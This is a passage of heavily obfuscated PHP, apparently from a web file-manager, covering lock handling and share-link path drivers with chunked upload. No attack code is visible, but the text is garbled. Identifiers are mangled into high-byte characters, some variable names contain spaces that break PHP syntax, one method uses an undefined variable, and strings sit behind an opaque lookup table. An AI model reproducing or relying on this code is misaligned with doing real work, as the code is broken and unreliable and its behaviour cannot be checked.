sprintf($É˜ìÖõÏ[962], timeFloat() - $ŸŠ¬ÍÕ¶) . $É˜ìÖõÏ[963] . $›Ä‘Šù . $É˜ìÖõÏ[964] . json_encode(error_get_last()), $É˜ìÖõÏ[954]); show_json($¸Ï‹ŒŞ, !1); } if (!$ˆ™ñ¦ûš) { self::$lockItem[$é›à¹Ëœ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ì„³·û = number_format(timeFloat() - $ë’ÖÕ§û, 3); write_log($É˜ìÖõÏ[965] . $ƒÌÎâ¡ . $É˜ìÖõÏ[966] . $Ì„³·û, $É˜ìÖõÏ[954]); } return $È´ªûıû; } public static function lockGet($Ş°ğ‘ö) { $ŸêĞ—® = self::key($Ş°ğ‘ö); if (self::$lockItem[$ŸêĞ—®]) { return self::$lockItem[$ŸêĞ—®]; } return self::init()->lockGet($ŸêĞ—®); } public static function unlock($ò†Ôöß¶) { $ãä—å‚÷ =& $_SERVER[€ä¾™²]; $œË†Ø¨« = self::key($ò†Ôöß¶); self::$lockItem[$œË†Ø¨«] = null; self::init()->unlock($œË†Ø¨«); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ãä—å‚÷[967] . $ò†Ôöß¶, $ãä—å‚÷[954]); } return; } public static function unlockRuntime() { $ºšúõŸÜ =& $_SERVER[€ä¾™²]; $÷í¹¬·§ = self::init(); $¡¿ùêâô = !1; foreach (self::$lockItem as $Ì½ñâãã => $¾¤ø´Ÿ„) { if (!$¾¤ø´Ÿ„) { continue; } $÷í¹¬·§->unlock($Ì½ñâãã); if (!$¡¿ùêâô) { $¡¿ùêâô = !0; write_log($ºšúõŸÜ[968] . $Ì½ñâãã . $ºšúõŸÜ[74] . get_caller_msg(), $ºšúõŸÜ[954]); continue; } write_log($ºšúõŸÜ[968] . $Ì½ñâãã, $ºšúõŸÜ[954]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $³‘È€¶“ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ºšúõŸÜ[969] . $³‘È€¶“ . $ºšúõŸÜ[970] . ACTION, $ºšúõŸÜ[954]); } } public static function fileLock($Ñèí›³Œ) { $Ù»ŸÔÀü =& $_SERVER[€ä¾™²]; if (!$GLOBALS[$Ù»ŸÔÀü[971]]) { $GLOBALS[$Ù»ŸÔÀü[971]] = array(); } $GLOBALS[$Ù»ŸÔÀü[971]][$Ñèí›³Œ] = !1; $¨ŠŒğ½ş = fopen(DATA_PATH . $Ñèí›³Œ . $Ù»ŸÔÀü[972], $Ù»ŸÔÀü[973]); if (!$¨ŠŒğ½ş) { return !1; } $GLOBALS[$Ù»ŸÔÀü[971]][$Ñèí›³Œ] = $¨ŠŒğ½ş; if (flock($¨ŠŒğ½ş, LOCK_EX)) { return !0; } self::unlock($Ñèí›³Œ); show_json($Ù»ŸÔÀü[974], !1); return !1; } public static function fileUnlock($×ª…à) { $½ô¡“ã“ =& $_SERVER[€ä¾™²]; $á¸ˆ§ú = $GLOBALS[$½ô¡“ã“[971]][$×ª…à]; if (!$á¸ˆ§ú) { return; } $GLOBALS[$½ô¡“ã“[971]][$×ª…à] = !1; flock($á¸ˆ§ú, LOCK_UN); fclose($á¸ˆ§ú); } public static function fileUnlockAll() { $¡¨Ï›â— =& $_SERVER[€ä¾™²]; if (!isset($GLOBALS[$¡¨Ï›â—[971]]) || !$GLOBALS[$¡¨Ï›â—[971]]) { return; } foreach ($GLOBALS[$¡¨Ï›â—[971]] as $ı‰Õïì => $Ñ§ÍÜÁŞ) { if (!$Ñ§ÍÜÁŞ) { continue; } $GLOBALS[$¡¨Ï›â—[971]][$ı‰Õïì] = !1; flock($Ñ§ÍÜÁŞ, LOCK_UN); fclose($Ñ§ÍÜÁŞ); } $GLOBALS[$¡¨Ï›â—[971]] = array(); } } goto Dê¥Ò°Ë¬Á; C”Ú‘„…¶¦: class PathDriverDriverShareItem { public function __construct($ç¡ÇˆÕã) { $this->pathParse = $ç¡ÇˆÕã; } public function __call($‰·³ÅÏî, $¸„åÎ«¬) { $ôË’¯Õ« =& $_SERVER[€ä¾™²]; if (method_exists($this, $‰·³ÅÏî)) { return; } $ë…øÔÎ¹ = call_user_func_array(array($ôË’¯Õ«[1488], $‰·³ÅÏî), $¸„åÎ«¬); $Æ®°¡«‰ = array($ôË’¯Õ«[1489], $ôË’¯Õ«[1490], $ôË’¯Õ«[1491], $ôË’¯Õ«[1492], $ôË’¯Õ«[648], $ôË’¯Õ«[650], $ôË’¯Õ«[1493], $ôË’¯Õ«[108], $ôË’¯Õ«[1494], $ôË’¯Õ«[1495]); if (in_array($‰·³ÅÏî, $Æ®°¡«‰)) { $ë…øÔÎ¹ = $this->getPathOuter($ë…øÔÎ¹); } return $ë…øÔÎ¹; } public function copy($†‡ÃöÛ, $æ¹Ğ¦”Ì, $€òıÌÑô = false, $ùÇÔ‰»„ = false) { return $this->copyMove($†‡ÃöÛ, $æ¹Ğ¦”Ì, $€òıÌÑô, $_SERVER[€ä¾™²][648], $ùÇÔ‰»„); } public function move($œÓ¨´óÀ, $¤Ö©‡Ä, $¡Ó½åıõ = false, $Ÿ¶–äô = false) { return $this->copyMove($œÓ¨´óÀ, $¤Ö©‡Ä, $¡Ó½åıõ, $_SERVER[€ä¾™²][650], $Ÿ¶–äô); } private function copyMove($†÷à›, $À‘ıÆ¿™, $ÅÜ©¢ˆé, $ªô›Õõ¾, $•»Í Õã = false) { $óäùå˜ =& $_SERVER[€ä¾™²]; $•Íˆë¹ = $À‘ıÆ¿™; $ßÖ›Àèá = IO::driverMake($À‘ıÆ¿™); if ($ßÖ›Àèá->pathParse[$óäùå˜[1280]]) { $À‘ıÆ¿™ = $ßÖ›Àèá->pathParse[$óäùå˜[1280]]; } else { $À‘ıÆ¿™ = $•Íˆë¹; } $şºÉ†Ã = IO::copyMove($†÷à›, $À‘ıÆ¿™, $ÅÜ©¢ˆé, $ªô›Õõ¾, $•»Í Õã); $şºÉ†Ã = $this->getPathOuter($şºÉ†Ã); return $şºÉ†Ã; } public function pathThis($‡¡½çÄ) { return get_path_this($this->pathParse[$_SERVER[€ä¾™²][87]]); } public function pathFather($Û‘´™Ïí) { return get_path_father($this->pathParse[$_SERVER[€ä¾™²][87]]); } public function iconvSystem($–Óƒœ”Ü) { return $–Óƒœ”Ü; } protected function infoParse($ç›Ü·ÔÁ, $‹§©¹ÄÉ = false) { $ı³Ø†ˆí =& $_SERVER[€ä¾™²]; $³–Áš¬ = $this->pathParse[$ı³Ø†ˆí[583]][$ı³Ø†ˆí[590]] . $this->pathParse[$ı³Ø†ˆí[1299]]; if ($‹§©¹ÄÉ) { $­‘Û…Ä = IO::infoWithChildren($³–Áš¬); } else { $­‘Û…Ä = IO::info($³–Áš¬); } $½ı¤ôñ = $this->pathParse[$ı³Ø†ˆí[583]]; return Action($ı³Ø†ˆí[1486])->_shareItemeParse($­‘Û…Ä, $½ı¤ôñ); } public function listAll($²Äµ‹Ë®) { $‚ÊÓ¶Û˜ =& $_SERVER[€ä¾™²]; $Ù¦æ•ó = IO::listAll($²Äµ‹Ë®); $ôô½›ÓË = rtrim($this->pathParse[$‚ÊÓ¶Û˜[583]][$‚ÊÓ¶Û˜[590]], $‚ÊÓ¶Û˜[8]); foreach ($Ù¦æ•ó as &$µôŒšãÉ) { $µôŒšãÉ[$‚ÊÓ¶Û˜[87]] = $this->pathDriver . $‚ÊÓ¶Û˜[8] . ltrim(substr($µôŒšãÉ[$‚ÊÓ¶Û˜[87]], strlen($ôô½›ÓË)), $‚ÊÓ¶Û˜[8]); } unset($µôŒšãÉ); return $Ù¦æ•ó; } public function listAllSimple($Š‘…äÈ¡, $†ø»¾ Î = false) { $•·‰ÀÑ =& $_SERVER[€ä¾™²]; $‡³°óç = $this->listAll($Š‘…äÈ¡); $•ê¯ŞÏÁ = $this->pathParse[$•·‰ÀÑ[517]]; if (trim($•ê¯ŞÏÁ, $•·‰ÀÑ[8]) == trim(get_path_father($•ê¯ŞÏÁ), $•·‰ÀÑ[8])) { $†ø»¾ Î = !0; } return IO::init($•·‰ÀÑ[12])->listAllSimpleMake($‡³°óç, $•ê¯ŞÏÁ, $†ø»¾ Î); } public function getPathOuter($ó–ŸıÛÆ) { $¤Åæ†Öş =& $_SERVER[€ä¾™²]; $ ğ½ŸúÒ = KodIO::parse($ó–ŸıÛÆ); if ($ ğ½ŸúÒ[$¤Åæ†Öş[33]] == KodIO::KOD_SHARE_ITEM) { return $ ğ½ŸúÒ[$¤Åæ†Öş[87]]; } $Ìùö«ÂŒ = KodIO::clear($ó–ŸıÛÆ); $•Ù²Œò§ = KodIO::clear($this->pathParse[$¤Åæ†Öş[583]][$¤Åæ†Öş[590]]); $õé÷—¤î = substr($Ìùö«ÂŒ, strlen($•Ù²Œò§)); if (substr($Ìùö«ÂŒ, 0, strlen($•Ù²Œò§)) != $•Ù²Œò§) { return !1; } return $this->pathParse[$¤Åæ†Öş[1300]] . $¤Åæ†Öş[8] . ltrim($õé÷—¤î, $¤Åæ†Öş[8]); } public function getType() { $êéıÛã =& $_SERVER[€ä¾™²]; $ˆ¼ı¤Ú = str_replace($êéıÛã[77], $êéıÛã[12], get_class($this)); return strtolower($ˆ¼ı¤Ú); } public function isOsDriver($Ğ­„¦¸’) { return IO::isOsDriver($Ğ­„¦¸’); } public function info($Ñ¶ŞŞ‹) { return $this->infoParse($Ñ¶ŞŞ‹); } public function infoAuth($ ¥Õ•¶) { return $this->infoParse($ ¥Õ•¶); } public function infoWithChildren($şŠº“ÜÈ) { return $this->infoParse($şŠº“ÜÈ, !0); } public function infoFull($µ˜ëË¦) { return $this->infoParse($µ˜ëË¦); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ğ´ŸÁı¼) { $this->pathParse = $ğ´ŸÁı¼; } protected function infoParse($Î”›ªäø, $½âî”ŠÂ = false) { $¢ÂãîÓ =& $_SERVER[€ä¾™²]; return Action($¢ÂãîÓ[1306])->sharePathInfo($this->pathParse[$¢ÂãîÓ[87]], !0, $½âî”ŠÂ); } public function listPath($Ó©‘ÛÍñ, $Ì˜ıÌŸƒ = false) { $Æ¾€¹ˆ  =& $_SERVER[€ä¾™²]; $õ‚ˆ…› = IO::listPath($Ó©‘ÛÍñ, $Ì˜ıÌŸƒ); if (!$õ‚ˆ…›) { return $õ‚ˆ…›; } if (is_array($õ‚ˆ…›[$Æ¾€¹ˆ [1487]])) { $ØÌÅ¢æ£ = Action($Æ¾€¹ˆ [1496])->parsePathChildren($õ‚ˆ…›[$Æ¾€¹ˆ [1487]], array($Æ¾€¹ˆ [517] => $Ó©‘ÛÍñ)); $õ‚ˆ…›[$Æ¾€¹ˆ [1487]] = Action($Æ¾€¹ˆ [1306])->shareItemInfo($ØÌÅ¢æ£); } foreach ($õ‚ˆ…› as $ƒ¹¿ÂÕñ => $ÖÎÊ“‡) { if (!in_array($ƒ¹¿ÂÕñ, array($Æ¾€¹ˆ [86], $Æ¾€¹ˆ [85]))) { continue; } foreach ($ÖÎÊ“‡ as $¯à­Ğˆ‚ => $ØÌÅ¢æ£) { $ØÌÅ¢æ£ = Action($Æ¾€¹ˆ [1496])->parsePathChildren($ØÌÅ¢æ£, array($Æ¾€¹ˆ [517] => $Ó©‘ÛÍñ)); $õ‚ˆ…›[$ƒ¹¿ÂÕñ][$¯à­Ğˆ‚] = Action($Æ¾€¹ˆ [1306])->shareItemInfo($ØÌÅ¢æ£); } } return $õ‚ˆ…›; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($ÛÓç¨‡È) { $™¸«¼Û =& $_SERVER[€ä¾™²]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $ÛÓç¨‡È; $Ÿ«®ş‘ = Model($™¸«¼Û[693])->getInfo($ÛÓç¨‡È[$™¸«¼Û[486]]); $÷Ê…Ìûı = _get($Ÿ«®ş‘, $™¸«¼Û[587]); $şÄäå´¸ = Model($™¸«¼Û[594])->authMake(_get($Ÿ«®ş‘, $™¸«¼Û[1497])); if (!$Ÿ«®ş‘) { IO::errorTips(LNG($™¸«¼Û[1498]), !1); } if (!$şÄäå´¸) { IO::errorTips(LNG($™¸«¼Û[1499]), !1); } if ($÷Ê…Ìûı && is_string($÷Ê…Ìûı)) { $÷Ê…Ìûı = json_decode($÷Ê…Ìûı, !0); } if (!$÷Ê…Ìûı || !$şÄäå´¸) { return; } $this->_config = array($™¸«¼Û[1300] => rtrim($ÛÓç¨‡È[$™¸«¼Û[1300]], $™¸«¼Û[8]) . $™¸«¼Û[8], $™¸«¼Û[1500] => $™¸«¼Û[1407] . $÷Ê…Ìûı[$™¸«¼Û[1501]] . $™¸«¼Û[506], $™¸«¼Û[583] => $Ÿ«®ş‘, $™¸«¼Û[587] => $÷Ê…Ìûı, $™¸«¼Û[1502] => $şÄäå´¸, $™¸«¼Û[1503] => substr(APP_HOST, 0, 8) == $™¸«¼Û[218], $™¸«¼Û[1504] => Model($™¸«¼Û[598])->authCheck($şÄäå´¸[$™¸«¼Û[510]], AuthModel::AUTH_VIEW, !1), $™¸«¼Û[1505] => Model($™¸«¼Û[598])->authCheck($şÄäå´¸[$™¸«¼Û[510]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($Øé˜èİŸ) { $ùõµ–Ú¦ =& $_SERVER[€ä¾™²]; $ÏŠè–Å÷ = $this->_config; if (!$ÏŠè–Å÷) { return !1; } $Õ—±°Å = array($ùõµ–Ú¦[1506] => $ÏŠè–Å÷[$ùõµ–Ú¦[1504]], $ùõµ–Ú¦[1507] => $ÏŠè–Å÷[$ùõµ–Ú¦[1504]], $ùõµ–Ú¦[1328] => $ÏŠè–Å÷[$ùõµ–Ú¦[1504]], $ùõµ–Ú¦[108] => $ÏŠè–Å÷[$ùõµ–Ú¦[1505]], $ùõµ–Ú¦[1508] => $ÏŠè–Å÷[$ùõµ–Ú¦[1505]], $ùõµ–Ú¦[1277] => $ÏŠè–Å÷[$ùõµ–Ú¦[1505]], $ùõµ–Ú¦[1509] => !1, $ùõµ–Ú¦[430] => !1, $ùõµ–Ú¦[1510] => !1, $ùõµ–Ú¦[1511] => !1); return $Õ—±°Å[$Øé˜èİŸ]; } public function listPath($Ş„£øË, $¨˜ú¸ıê = false) { return $this->request($_SERVER[€ä¾™²][1512], array($Ş„£øË)); } public function setContent($øÎç¨Îµ, $¿²µÅ˜ = '') { return $this->request($_SERVER[€ä¾™²][1513], array($øÎç¨Îµ, $¿²µÅ˜)); } public function getContent($°›œŠñù) { return $this->_fileSubstr($°›œŠñù); } public function fileSubstr($‘¸ ­Çï, $™ı®˜ì, $ûÏ‚¸Õ—) { return $this->_fileSubstr($‘¸ ­Çï, $™ı®˜ì, $ûÏ‚¸Õ—); } public function download($¢“Šöª, $‚È†¢ã) { return $this->_download($¢“Šöª, $‚È†¢ã); } public function isFileOutServer() { return !1; } public function fileOut($®½åÛ×Ş, $ˆßÑò = false, $Şî±ì’ = false, $Á€¡¸Â• = '') { $¬Š³€×İ =& $_SERVER[€ä¾™²]; $this->fileOutLink($this->_fileLink($®½åÛ×Ş, ($Á€¡¸Â• ? $¬Š³€×İ[1514] . $Á€¡¸Â• : $¬Š³€×İ[12]) . ($ˆßÑò ? $¬Š³€×İ[1515] : $¬Š³€×İ[12]))); } public function fileOutImage($¥Ö¤İ¯Æ, $‹Û¯½À© = 250) { $this->fileOutLink($this->_fileLink($¥Ö¤İ¯Æ, $_SERVER[€ä¾™²][1516] . $‹Û¯½À©)); } public function fileOutLink($Œû•ıµ) { header($_SERVER[€ä¾™²][173] . $this->urlAuto($Œû•ıµ)); die; } public function exist($Êá¶øå) { $ïÛóÍ‘È = $this->_info($Êá¶øå); return $ïÛóÍ‘È ? !0 : !1; } public function isFile($Şã©Ä¼Ê) { $Üİ›Ú˜Â =& $_SERVER[€ä¾™²]; $¿£™û¯È = $this->_info($Şã©Ä¼Ê); return _get($¿£™û¯È, $Üİ›Ú˜Â[33], $Üİ›Ú˜Â[12]) == $Üİ›Ú˜Â[231]; } public function isFolder($ÏğôÇó«) { $Ë—¼Æİ· =& $_SERVER[€ä¾™²]; $‚äŞÀÉÊ = $this->_info($ÏğôÇó«); return _get($‚äŞÀÉÊ, $Ë—¼Æİ·[33], $Ë—¼Æİ·[12]) == $Ë—¼Æİ·[78]; } public function size($ú»‰´›·) { $ûº„Ãšô = $this->_info($ú»‰´›·); return _get($ûº„Ãšô, $_SERVER[€ä¾™²][79], 0); } public function info($ïÔ¹›¼ı) { return $this->_info($ïÔ¹›¼ı); } public function infoAuth($™«ş®…Ï) { return $this->_info($™«ş®…Ï); } public function infoFull($ÅÏüá Ç) { return $this->_info($ÅÏüá Ç); } public function infoFullSimple($µ†â‰«›) { return $this->_info($µ†â‰«›); } public function infoWithChildren($Óæ÷øğ) { return $this->_info($Óæ÷øğ, !0); } public function has($½Û¿¬È, $Á«¤¥¶ = false, $ïÊË¬Ü€ = false) { $„ì­Šñ½ =& $_SERVER[€ä¾™²]; $¡€Î°‡§ = $this->_info($½Û¿¬È); if (!$¡€Î°‡§) { return !1; } if ($Á«¤¥¶) { return array($„ì­Šñ½[240] => $¡€Î°‡§[$„ì­Šñ½[240]], $„ì­Šñ½[241] => $¡€Î°‡§[$„ì­Šñ½[241]]); } return $„ªÌà Ë ? $¡€Î°‡§[$„ì­Šñ½[240]] > 0 : $¡€Î°‡§[$„ì­Šñ½[241]] > 0; } public function mkfile($¸÷óø¶Å, $Ş…Ü¬¥ = '', $ßàî÷ø… = REPEAT_RENAME) { return $this->request($_SERVER[€ä¾™²][1489], array($¸÷óø¶Å, $Ş…Ü¬¥, $ßàî÷ø…)); } public function mkdir($åÍ½ å›, $Û““–ù = REPEAT_SKIP) { return $this->request($_SERVER[€ä¾™²][1490], array($åÍ½ å›, $Û““–ù)); } public function remove($ëƒûÄ¶ö) { return $this->request($_SERVER[€ä¾™²][1277], array($ëƒûÄ¶ö)); } public function rename($÷ßŒ¾ãĞ, $å»ßøÜ¨) { return $this->request($_SERVER[€ä¾™²][1493], array($÷ßŒ¾ãĞ, $å»ßøÜ¨)); } public function moveSameAllow() { } public function copy($Ğ™ùˆ²ã, $÷Ì™ìò”, $÷áì£™ = REPEAT_REPLACE, $¯Æ’Áş = false) { return $this->request($_SERVER[€ä¾™²][648], array($Ğ™ùˆ²ã, $÷Ì™ìò”, $÷áì£™)); } public function move($õ„Äå£¬, $„Üé š, $·©Ğö±í = REPEAT_REPLACE, $”ŠÂšŞŠ = false) { return $this->request($_SERVER[€ä¾™²][650], array($õ„Äå£¬, $„Üé š, $·©Ğö±í)); } public function uploadLink($¤ØªØîÈ, $èÁùÒËº = 0) { $•ïö¾¼ =& $_SERVER[€ä¾™²]; $ş·…ÎÌ” = IO::init($GLOBALS[$•ïö¾¼[7]][$•ïö¾¼[87]]); $Æıòõ¸À = $this->pathApiEncode($ş·…ÎÌ”->path); $ĞåÈ•´³ = $this->requestMakeUrl($•ïö¾¼[1517], array($•ïö¾¼[87] => $Æıòõ¸À)); return array($•ïö¾¼[1518] => $ĞåÈ•´³); } public function upload($‘Ğ´í½‰, $ñ»ÁÛ‡­, $¼À™Ó‰è = false, $¥’Ò³‡ä = REPEAT_REPLACE) { $ĞåòãäÁ =& $_SERVER[€ä¾™²]; if (filesize($ñ»ÁÛ‡­) < $this->uploadChunkSize) { return $this->request($ĞåòãäÁ[108], array($‘Ğ´í½‰, $ñ»ÁÛ‡­, $¥’Ò³‡ä)); } $çÜµË¶” = $this->uploadHashCheck($‘Ğ´í½‰, $ñ»ÁÛ‡­, $¥’Ò³‡ä); if ($çÜµË¶”) { return $çÜµË¶”; } $ñ®Œµ‚Ê = @filesize($ñ»ÁÛ‡­); $óÄ¿©ë¾ = $this->uploadChunkSize; $¦‘«õ ¸ = ceil($ñ®Œµ‚Ê / $óÄ¿©ë¾); $™¼À’×Ò = 0; while ($™¼À’×Ò < $¦‘«õ ¸) { $ìØá‰Ú = IO::fileSubstr($ñ»ÁÛ‡­, $™¼À’×Ò * $óÄ¿©ë¾, $óÄ¿©ë¾); $ÔíïèûÓ = $this->tempFile($ĞåòãäÁ[12], $ìØá‰Ú); $ÖûÇ¡Ô¾ = array($ĞåòãäÁ[79] => $ñ®Œµ‚Ê, $ĞåòãäÁ[1519] => $óÄ¿©ë¾, $ĞåòãäÁ[1520] => $¦‘«õ ¸, $ĞåòãäÁ[1521] => $™¼À’×Ò); $Œ’íÁÜ¸ = $this->uploadSend($‘Ğ´í½‰, $ÔíïèûÓ, $ÖûÇ¡Ô¾, $¥’Ò³‡ä); $™¼À’×Ò++; if (!$Œ’íÁÜ¸) { return !1; } } if (!is_array($Œ’íÁÜ¸) || empty($Œ’íÁÜ¸[$ĞåòãäÁ[602]])) { return !1; } return $this->pathApiDecode($Œ’íÁÜ¸[$ĞåòãäÁ[602]]); } private function uploadHashCheck($¨É†ãáÃ, $Š èá, $ö½ˆò”) { $Şıàé»È =& $_SERVER[€ä¾™²]; $Ë¦¶µé„ = IO::hashSimple($Š èá); $““²®Äô = array($Şıàé»È[1522] => $Şıàé»È[1523], $Şıàé»È[1481] => $Ë¦¶µé„); $­ˆÁñ¸ = $this->uploadSend($¨É†ãáÃ, $Şıàé»È[12], $““²®Äô, $ö½ˆò”); $ìÍ£…³û = _get($­ˆÁñ¸, $Şıàé»È[602], array()); $…¯×Â = _get($ìÍ£…³û, $Şıàé»È[1524]); if (!is_array($…¯×Â) || !$…¯×Â[$Şıàé»È[570]]) { return !1; } $Ì‹Œú’‹ = IO::hashMd5($Š èá); if ($…¯×Â[$Şıàé»È[570]] != $Ì‹Œú’‹) { return !1; } if ($­ˆÁñ¸[$Şıàé»È[602]][$Şıàé»È[1525]]) { $this->uploadChunkSize = $­ˆÁñ¸[$Şıàé»È[602]][$Şıàé»È[1525]]; } $““²®Äô = array($Şıàé»È[1522] => $Şıàé»È[1526], $Şıàé»È[1482] => $Ì‹Œú’‹, $Şıàé»È[1481] => $Ë¦¶µé„); $­ˆÁñ¸ = $this->uploadSend($¨É†ãáÃ, $Şıàé»È[12], $““²®Äô, $ö½ˆò”); if (!is_array($­ˆÁñ¸) || empty($­ˆÁñ¸[$Şıàé»È[602]])) { return !1; } return $this->pathApiDecode($­ˆÁñ¸[$Şıàé»È[602]]); } private function uploadSend($ÛŒ¾øÈã, $¾œ’¨ÜÏ, $ÂÊ÷áØ, $È¢°¦ğÎ = '') { $Õæ°ìæ =& $_SERVER[€ä¾™²]; $ÂÊ÷áØ[$Õæ°ìæ[32]] = get_path_this($ÛŒ¾øÈã); $ÂÊ÷áØ[$Õæ°ìæ[87]] = $this->pathApiEncode(get_path_father($ÛŒ¾øÈã)); if ($È¢°¦ğÎ) { $ÂÊ÷áØ[$Õæ°ìæ[1527]] = $È¢°¦ğÎ; } if ($¾œ’¨ÜÏ) { $ÂÊ÷áØ[$Õæ°ìæ[231]] = $Õæ°ìæ[1342] . $¾œ’¨ÜÏ; } return $this->requestSend($Õæ°ìæ[1517], $ÂÊ÷áØ); } protected function pathApiEncode($Ò¬ğËşú) { $èŞ˜Ô‡ =& $_SERVER[€ä¾™²]; $ŞÅÓ—¿ = $this->_config[$èŞ˜Ô‡[1500]]; $í®„ƒúê = strlen($ŞÅÓ—¿); if (substr($Ò¬ğËşú, 0, $í®„ƒúê) == $ŞÅÓ—¿) { return $Ò¬ğËşú; } return $ŞÅÓ—¿ . ltrim($Ò¬ğËşú, $èŞ˜Ô‡[8]); } protected function pathApiDecode($©ü”ÏÂ) { $šòÍÀÁ« =& $_SERVER[€ä¾™²]; $İú€ÜÀ€ = $this->_config[$šòÍÀÁ«[1500]]; $ŞÇ¬»™÷ = strlen($İú€ÜÀ€); if (substr($©ü”ÏÂ, 0, $ŞÇ¬»™÷) !== $İú€ÜÀ€) { return $©ü”ÏÂ; } return $this->_config[$šòÍÀÁ«[1300]] . ltrim(substr($©ü”ÏÂ, $ŞÇ¬»™÷), $šòÍÀÁ«[8]); } private function pathInfoParse(&$¨ôéĞÏ) { $£³‚×âÔ =& $_SERVER[€ä¾™²]; $¡»³Úì½ = $this->_config; $ÛŠõóñ« = $¡»³Úì½[$£³‚×âÔ[583]]; if (!$¨ôéĞÏ || !is_array($¨ôéĞÏ)) { return $¨ôéĞÏ; } static $œí‡¢² = array(); $­„°Ã¹ê = $œí‡¢²[$ÛŠõóñ«[$£³‚×âÔ[694]]]; if (!is_array($­„°Ã¹ê)) { $Ìó¡ğ³š = LNG($£³‚×âÔ[1528]); $â·Ãçæª = $¡»³Úì½[$£³‚×âÔ[587]][$£³‚×âÔ[90]]; $°ÃÓµ½‹ = parse_url($¡»³Úì½[$£³‚×âÔ[587]][$£³‚×âÔ[1529]]); $¢éÏÍ¦Å = $¡»³Úì½[$£³‚×âÔ[587]][$£³‚×âÔ[1530]]; $­„°Ã¹ê = array($£³‚×âÔ[1531] => $â·Ãçæª[$£³‚×âÔ[32]] . $£³‚×âÔ[1013] . $¢éÏÍ¦Å . $£³‚×âÔ[1342] . $°ÃÓµ½‹[$£³‚×âÔ[207]] . $£³‚×âÔ[1015], $£³‚×âÔ[1532] => $Ìó¡ğ³š . $£³‚×âÔ[1079] . $¡»³Úì½[$£³‚×âÔ[587]][$£³‚×âÔ[1529]] . $£³‚×âÔ[1533] . LNG($£³‚×âÔ[1534]) . $£³‚×âÔ[1079] . $¢éÏÍ¦Å, $£³‚×âÔ[1535] => LNG($£³‚×âÔ[1536]) . $£³‚×âÔ[1537] . $¡»³Úì½[$£³‚×âÔ[587]][$£³‚×âÔ[1529]] . $£³‚×âÔ[286] . LNG($£³‚×âÔ[1538]) . $£³‚×âÔ[1537] . $â·Ãçæª[$£³‚×âÔ[609]], $£³‚×âÔ[1530] => array($£³‚×âÔ[32] => $¢éÏÍ¦Å, $£³‚×âÔ[1539] => $£³‚×âÔ[1540]), $£³‚×âÔ[1541] => Action($£³‚×âÔ[1486])->shareTargetMake($ÛŠõóñ«[$£³‚×âÔ[1497]])); $œí‡¢²[$ÛŠõóñ«[$£³‚×âÔ[694]]] = $­„°Ã¹ê; } unset($¨ôéĞÏ[$£³‚×âÔ[192]]); unset($¨ôéĞÏ[$£³‚×âÔ[611]]); unset($¨ôéĞÏ[$£³‚×âÔ[189]]); unset($¨ôéĞÏ[$£³‚×âÔ[596]]); $¨ôéĞÏ[$£³‚×âÔ[1542]] = !0; $¨ôéĞÏ[$£³‚×âÔ[233]] = $¡»³Úì½[$£³‚×âÔ[1504]]; $¨ôéĞÏ[$£³‚×âÔ[234]] = $¡»³Úì½[$£³‚×âÔ[1505]]; $¨ôéĞÏ[$£³‚×âÔ[509]] = $¡»³Úì½[$£³‚×âÔ[1502]]; $¨ôéĞÏ[$£³‚×âÔ[1530]] = $­„°Ã¹ê[$£³‚×âÔ[1530]]; $¨ôéĞÏ[$£³‚×âÔ[1543]] = $ÛŠõóñ«[$£³‚×âÔ[232]]; $¨ôéĞÏ[$£³‚×âÔ[1544]] = $ÛŠõóñ«[$£³‚×âÔ[88]]; $¨ôéĞÏ[$£³‚×âÔ[1545]] = $­„°Ã¹ê[$£³‚×âÔ[1535]]; $¨ôéĞÏ[$£³‚×âÔ[1541]] = $­„°Ã¹ê[$£³‚×âÔ[1541]]; $¨ÇÈÒâÄ = explode($£³‚×âÔ[8], trim($¨ôéĞÏ[$£³‚×âÔ[609]], $£³‚×âÔ[8])); $¨ÇÈÒâÄ[0] = $­„°Ã¹ê[$£³‚×âÔ[1531]]; $¨ôéĞÏ[$£³‚×âÔ[609]] = implode($£³‚×âÔ[8], $¨ÇÈÒâÄ); if (count($¨ÇÈÒâÄ) > 1) { unset($¨ôéĞÏ[$£³‚×âÔ[1541]]); } if (count($¨ÇÈÒâÄ) == 1) { if ($¨ôéĞÏ[$£³‚×âÔ[33]] == $£³‚×âÔ[78]) { $¨ôéĞÏ[$£³‚×âÔ[32]] = $­„°Ã¹ê[$£³‚×âÔ[1531]]; } array_set_value($¨ôéĞÏ, $£³‚×âÔ[1546], $­„°Ã¹ê[$£³‚×âÔ[1532]]); } $´Ø½¦âİ = array($£³‚×âÔ[1547], $£³‚×âÔ[1466], $£³‚×âÔ[1548], $£³‚×âÔ[1549]); foreach ($´Ø½¦âİ as $·„„ŠĞ½) { $üÅë·å = $this->urlAuto(_get($¨ôéĞÏ, $·„„ŠĞ½, $£³‚×âÔ[12])); if ($üÅë·å) { array_set_value($¨ôéĞÏ, $·„„ŠĞ½, $üÅë·å); } } } private function _info($¡ÜÏñà, $¸ü©’¥­ = false) { $×§Æ¹é’ =& $_SERVER[€ä¾™²]; $¯şà¥™ = $this->_config; if (!$¯şà¥™) { return !1; } static $»ÇÁàãˆ = array(); if (isset($»ÇÁàãˆ[$¡ÜÏñà]) && is_array($»ÇÁàãˆ[$¡ÜÏñà])) { return $»ÇÁàãˆ[$¡ÜÏñà]; } if ((!$¡ÜÏñà || !trim($¡ÜÏñà, $×§Æ¹é’[8])) && !$¸ü©’¥­) { $­šÉÑ‚¾ = $¯şà¥™[$×§Æ¹é’[587]][$×§Æ¹é’[90]]; if (!$­šÉÑ‚¾) { return !1; } $­šÉÑ‚¾[$×§Æ¹é’[609]] = $×§Æ¹é’[12]; $­šÉÑ‚¾[$×§Æ¹é’[87]] = $¯şà¥™[$×§Æ¹é’[1300]]; $this->pathInfoParse($­šÉÑ‚¾); return $­šÉÑ‚¾; } $€€œÂÀ‘ = $this->request($×§Æ¹é’[1550], array($¡ÜÏñà, $¸ü©’¥­)); $»ÇÁàãˆ[$¡ÜÏñà] = $€€œÂÀ‘; return $€€œÂÀ‘; } private function _fileSubstr($¿ä±ôú°, $ÓÒà“½ = 0, $Õì¦Øà = -1) { 